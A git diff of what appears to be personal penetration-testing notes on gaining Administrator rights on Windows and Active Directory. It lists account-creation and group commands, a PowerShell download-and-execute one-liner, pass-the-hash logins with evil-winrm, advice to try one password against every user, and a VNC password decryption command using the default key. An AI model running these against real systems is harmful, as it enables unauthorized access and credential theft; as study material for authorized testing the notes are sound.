@@ -1,22 +1,33 @@
 # Windows
 Everything to check for when trying to become Administrator on Windows
 
-# Directories to check
-```bash
-# Temporary folder
-C:\Windows\System32\spool\drivers\color
+# Commands
+## User related
+**User and group info**
+```powershell
+# User info
+net user
 
-# See any suspicious apps 
-"C:\Program Files" or "C:\Program Files (x86)"
+# Show groups
+net group
 
-# Apps on old windows versions
-C:\Data\Users\app
+# Show local groups
+net localgroup <groupname>
 
-# Code policies and passwords in files
-C:\program files\windowspowershell\modules\packagemanagement
+# Add user to group
+net group <groupname> /add <username>
 ```
 
-# Commands
+**Account creation**
+```powershell
+# Create account
+net user <username> <password> /add
+
+# Create account (AD)
+# This will force the command to execute on the domain controller instead of the local computer
+net user <username> <password> /add /domain
+```
+
 ## Basic
 **Show drives**
 ```powershell
@@ -31,24 +42,22 @@ dir /R
 iex(new-object net.webclient).downloadstring('URL/FILENAME')
 ```
 
-## User related
-**Account creation**
-```powershell
-# Create account
-net user <username> <password> /add
+# Directories to check
+```bash
+# Temporary folder
+C:\Windows\System32\spool\drivers\color
 
-# Create account (AD)
-# This will force the command to execute on the domain controller instead of the local computer
-net user <username> <password> /add /domain
-```
+# See any suspicious apps 
+"C:\Program Files" or "C:\Program Files (x86)"
 
-**Group related (DC only)**
-```powershell
-# Show groups
-net group
+# Apps on old windows versions
+C:\Data\Users\app
 
-# Add user to group
-net group <groupname> /add <username>
+# Code policies and passwords in files
+C:\program files\windowspowershell\modules\packagemanagement
+
+# Config files
+C:\Windows\System32\config
 ```
 
 ### PowerView
@@ -75,6 +84,14 @@ Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalI
 ### References
 - [Powerview and PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
+
+# Privileged groups
+## AD Recycle Bin
+A user in the group is allowed to read / recover deleted AD objects.
+```powershell
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
 # Active Directory
 ## BloodHound and SharpHound
 This is used to visualise AD environments and discover attack paths.
@@ -95,6 +112,9 @@ evil-winrm -i <ip> -u <user> -p <password>
 # With Pass The Hash (NTLM)
 evil-winrm -i <ip> -u <user> -H <hash>
 ```
+
+**(If the password isn't working, try the password with all the users)**
+
 #### References
 - [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 - [https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
@@ -155,6 +175,17 @@ guestmount --add <vhd_file> --inspector --ro <mount_dir>
 ### References
 - [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)
 
+
+# VNC password decrypt
+VNC stores passwords as a hex string in `.vnc` files using a default encryption key
+```bash
+# Decrypt password
+echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+```
+
+## References
+- [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
+- [https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)
 
 # Softwares
 ## mRemoteNG
